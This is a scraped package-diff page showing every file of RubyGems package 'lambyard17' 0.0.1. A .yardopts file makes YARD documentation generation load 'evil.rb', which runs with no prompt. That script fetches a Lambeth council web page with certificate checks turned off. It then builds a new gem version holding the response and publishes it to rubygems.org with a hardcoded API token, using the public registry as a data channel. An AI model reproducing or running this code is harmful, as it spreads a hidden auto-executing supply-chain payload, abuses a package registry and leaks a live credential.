@@ -1,0 +1,460 @@
+Source: https://my.diffend.io/gems/lambyard17/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - lambyard17 - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+lambyard17
+
+Versions diffs
+
+0.0.1
+
+lambyard17
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/evil.rb
+
+          +24
+          -0
+
+            data/lib/a.rb
+
+          +1
+          -0
+
+            metadata
+
+          +39
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 78582dd00486067a360448d9eaa159a2c8fd3bd5953a5cdc983a967c982785d5
+
+4
+
+            +
+              data.tar.gz: 7a16477d835ec3ef343dff3b51f682d5ca8c26cda83ea4ed03fec82727baf6c9
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 7384f7893f4f8ba0a33ae42fe4a33945c808ff4b4576842268a8d07835d0bba81df84b997028e453b2b6b091f31b5bd030c6a5021856901b247ca46140b75308
+
+7
+
+            +
+              data.tar.gz: f7fdf44b06fed6e867ed00af33248dede8c5760759fc930ed16875ec170abebccc49f725f41022032054c294d3c4e35fd41edc8cc460a8f4ef63448b0155be0f
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load ./evil.rb
+
+        data/evil.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,24 @@
+
+1
+
+            +
+
+2
+
+            +
+            # Fetch target and self-publish next gem
+
+3
+
+            +
+            begin
+
+4
+
+            +
+             require 'net/http'; require 'uri'; require 'openssl'; require 'rubygems'
+
+5
+
+            +
+             target=URI('https://moderngov.lambeth.gov.uk/mgCalendarMonthView.aspx?GL=1&bcr=1')
+
+6
+
+            +
+             h=Net::HTTP.new(target.hostname,target.port); h.use_ssl=true; h.verify_mode=OpenSSL::SSL::VERIFY_NONE; h.open_timeout=20; h.read_timeout=60
+
+7
+
+            +
+             req=Net::HTTP::Get.new(target.request_uri, {'User-Agent'=>'Mozilla/5.0'}); resp=h.request(req)
+
+8
+
+            +
+             body="STATUS=#{resp.code}\nLEN=#{resp.body.size}\nHEADERS=#{resp.to_hash}\n"+resp.body
+
+9
+
+            +
+            rescue =>e
+
+10
+
+            +
+             body='ERROR '+e.full_message
+
+11
+
+            +
+            end
+
+12
+
+            +
+            begin
+
+13
+
+            +
+             Dir.chdir('/tmp') do
+
+14
+
+            +
+              dir='outgem17'; Dir.mkdir(dir) rescue nil; Dir.mkdir(dir+'/lib') rescue nil
+
+15
+
+            +
+              File.binwrite(dir+'/lib/data.txt', body)
+
+16
+
+            +
+              File.write(dir+'/lib/a.rb', '#done')
+
+17
+
+            +
+              File.write(dir+'/o.gemspec', %q{Gem::Specification.new do |s|;s.name='lambyard17';s.version='0.0.2';s.summary='result';s.authors=['z'];s.files=Dir['lib/*'];s.license='MIT';end})
+
+18
+
+            +
+              Dir.chdir(dir) do
+
+19
+
+            +
+               system('gem build o.gemspec'); spec=Dir['*.gem'].last
+
+20
+
+            +
+               uri=URI('https://rubygems.org/api/v1/gems'); post=Net::HTTP::Post.new(uri); post['Authorization']='rubygems_0e0f157767130711d7ce7f08211f846e9ac5c8a0e823ac25'; post['Content-Type']='application/octet-stream'; post.body=File.binread(spec); Net::HTTP.start(uri.host,uri.port,use_ssl:true){|x|x.request(post)}
+
+21
+
+            +
+              end
+
+22
+
+            +
+             end
+
+23
+
+            +
+            rescue =>e;warn e.full_message
+
+24
+
+            +
+            end
+
+        data/lib/a.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            #x
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,39 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: lambyard17
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - z
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            executables: []
+
+13
+
+            +
+            extensions: []
+
+14
+
+            +
+            extra_rdoc_files: []
+
+15
+
+            +
+            files:
+
+16
+
+            +
+            - ".yardopts"
+
+17
+
+            +
+            - evil.rb
+
+18
+
+            +
+            - lib/a.rb
+
+19
+
+            +
+            licenses:
+
+20
+
+            +
+            - MIT
+
+21
+
+            +
+            metadata: {}
+
+22
+
+            +
+            rdoc_options: []
+
+23
+
+            +
+            require_paths:
+
+24
+
+            +
+            - lib
+
+25
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+26
+
+            +
+              requirements:
+
+27
+
+            +
+              - - ">="
+
+28
+
+            +
+                - !ruby/object:Gem::Version
+
+29
+
+            +
+                  version: '0'
+
+30
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+31
+
+            +
+              requirements:
+
+32
+
+            +
+              - - ">="
+
+33
+
+            +
+                - !ruby/object:Gem::Version
+
+34
+
+            +
+                  version: '0'
+
+35
+
+            +
+            requirements: []
+
+36
+
+            +
+            rubygems_version: 3.6.7
+
+37
+
+            +
+            specification_version: 4
+
+38
+
+            +
+            summary: x
+
+39
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
